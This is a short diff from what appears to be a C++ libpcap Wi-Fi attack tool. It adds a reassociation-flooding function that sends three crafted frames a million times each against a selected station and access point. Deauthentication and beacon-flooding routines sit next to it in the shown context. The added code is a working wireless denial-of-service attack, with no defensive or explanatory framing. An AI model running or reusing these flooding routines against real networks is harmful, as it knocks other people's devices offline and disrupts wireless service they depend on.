@@ -501,7 +501,7 @@ void exe_deauth(pcap_t* handle,vector<uint8_t> sel_mac,struct ap sel_ap){
     printf("                               ");
     printf("------------------------------------------\n");
 }
-
+/*
 void exe_reasso(pcap_t* handle,vector<uint8_t> sel_mac,struct ap sel_ap){
 
     bool attack_defense=false;
@@ -539,7 +539,7 @@ void exe_reasso(pcap_t* handle,vector<uint8_t> sel_mac,struct ap sel_ap){
     printf("                               ");
     printf("------------------------------------------\n");
 
-}
+}*/
 
 void exe_beacon(pcap_t* handle,vector<uint8_t> sel_mac,struct ap sel_ap){
     uint8_t beacon1_size;
@@ -552,6 +552,20 @@ void exe_beacon(pcap_t* handle,vector<uint8_t> sel_mac,struct ap sel_ap){
      if (pcap_sendpacket(handle, beacon2, beacon1_size) != 0) printf("\nsend packet Error \n");
      if (pcap_sendpacket(handle, beacon3, beacon1_size) != 0) printf("\nsend packet Error \n");
      if(i%1000==0) printf("~Beacon Flooding~\n", i);
+    }
+}
+
+void exe_reasso(pcap_t* handle,vector<uint8_t> sel_mac,struct ap sel_ap){
+    uint8_t reasso_size;
+    uint8_t *reasso1=make_reasso(sel_mac,sel_ap,(uint8_t*)&reasso_size,1);
+    uint8_t *reasso2=make_reasso(sel_mac,sel_ap,(uint8_t*)&reasso_size,2);
+    uint8_t *reasso3=make_reasso(sel_mac,sel_ap,(uint8_t*)&reasso_size,3);
+
+    for(int i=0;i<1000000;i++){
+     if (pcap_sendpacket(handle, reasso1, reasso_size) != 0) printf("\nsend packet Error \n");
+     if (pcap_sendpacket(handle, reasso2, reasso_size) != 0) printf("\nsend packet Error \n");
+     if (pcap_sendpacket(handle, reasso3, reasso_size) != 0) printf("\nsend packet Error \n");
+     if(i%1000==0) printf("~reasso Flooding~\n", i);
     }
 }
 
